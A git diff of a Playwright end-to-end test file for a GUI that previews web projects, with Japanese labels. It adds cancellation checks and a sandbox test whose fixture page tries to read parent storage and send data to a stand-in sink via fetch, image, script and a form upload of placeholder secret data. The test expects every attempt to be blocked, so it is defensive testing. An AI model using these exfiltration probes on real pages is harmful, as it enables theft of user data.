@@ -461,9 +461,9 @@ test.describe("native GUI with real offline workers", () => {
     test.setTimeout(60_000);
     await mkdir(resolve(project, "public"));
     const html =
-      '<!doctype html><html lang="en"><head><meta charset="utf-8"><title>Counter</title><link rel="stylesheet" href="/style.css"><script type="module" src="/counter.js"></script></head><body><h1>Local counter</h1><output aria-label="Count">0</output><button>Increment</button></body></html>';
+      '<!doctype html><html lang="en"><head><meta charset="utf-8"><title>Counter</title><link rel="stylesheet" href="/style.css"><script type="module" src="/counter.js"></script></head><body><h1>Local counter</h1><output aria-label="Count">0</output><form><button type="submit">Increment</button></form></body></html>';
     const script =
-      'const {step} = await (await fetch("/settings.json")).json(); let count=0; document.querySelector("button").addEventListener("click",()=>{document.querySelector("output").textContent=String(count+=step);});';
+      'const {step} = await (await fetch("/settings.json")).json(); let count=0; document.querySelector("form").addEventListener("submit",event=>{event.preventDefault();document.querySelector("output").textContent=String(count+=step);});';
     for (const [path, content] of Object.entries({
       "public/index.html": html,
       "public/counter.js": script,
@@ -601,7 +601,7 @@ test.describe("native GUI with real offline workers", () => {
       const script = `let results=[]; for(const read of [()=>parent.document.body,()=>parent.sessionStorage,()=>localStorage]){try{read();results.push("leaked")}catch{results.push("denied")}}; Promise.all([fetch(${JSON.stringify(sinkUrl + "/fetch")}).then(()=>"leaked",()=>"blocked"),fetch(${JSON.stringify(parentOrigin + "/api/state")}).then(()=>"leaked",()=>"blocked")]).then(values=>{document.querySelector("output").textContent=results.concat(values).join(",")}); const img=new Image(); img.src=${JSON.stringify(sinkUrl + "/image")}; const s=document.createElement("script");s.src=${JSON.stringify(sinkUrl + "/script")};document.body.append(s);`;
       await writeFile(
         resolve(project, "index.html"),
-        `<!doctype html><html lang="en"><head><title>Boundaries</title><script type="module" src="/missing.js"></script></head><body><h1>Boundaries</h1><output aria-label="Boundary results">waiting</output><script>${script}</script></body></html>`,
+        `<!doctype html><html lang="en"><head><title>Boundaries</title><script type="module" src="/missing.js"></script></head><body><h1>Boundaries</h1><output aria-label="Boundary results">waiting</output><form action="${sinkUrl}/upload" method="post"><input name="secret" value="synthetic-private-data"><button>Attempt upload</button></form><script>${script}</script></body></html>`,
       );
       await preview(page);
       const frame = page.frameLocator(
@@ -610,6 +610,11 @@ test.describe("native GUI with real offline workers", () => {
       await expect(frame.getByLabel("Boundary results")).toHaveText(
         "denied,denied,denied,blocked,blocked",
       );
+      const formBlocked = page.waitForEvent("console", {
+        predicate: (message) => message.text().includes("form-action 'none'"),
+      });
+      await frame.getByRole("button", { name: "Attempt upload" }).click();
+      await formBlocked;
       await expect(
         page
           .getByRole("alert")
@@ -843,6 +848,19 @@ test.describe("native GUI with real offline workers", () => {
         })
       ).status,
     ).toBe(409);
+    let releaseCancel = () => {};
+    const cancelResponse = new Promise<void>((resolve) => {
+      releaseCancel = resolve;
+    });
+    let cancellationReachedHost = false;
+    await page.route("**/api/command", async (route) => {
+      if (route.request().postDataJSON()?.type !== "cancel")
+        return route.continue();
+      const response = await route.fetch();
+      cancellationReachedHost = true;
+      await cancelResponse;
+      await route.fulfill({ response });
+    });
     await page.getByRole("button", { name: "実行を中止" }).click();
     reply(
       held!,
@@ -857,6 +875,14 @@ test.describe("native GUI with real offline workers", () => {
     await page
       .getByRole("textbox", { name: "メッセージ", exact: true })
       .fill("Start an explicit new turn");
+    await expect.poll(() => cancellationReachedHost).toBe(true);
+    await expect(
+      page.getByRole("button", { name: "送信", exact: true }),
+    ).toBeDisabled();
+    releaseCancel();
+    await expect(
+      page.getByRole("button", { name: "送信", exact: true }),
+    ).toBeEnabled();
     await page.getByRole("button", { name: "送信", exact: true }).click();
     await expect(
       page.getByText("EXPLICIT-NEW-TURN", { exact: true }),
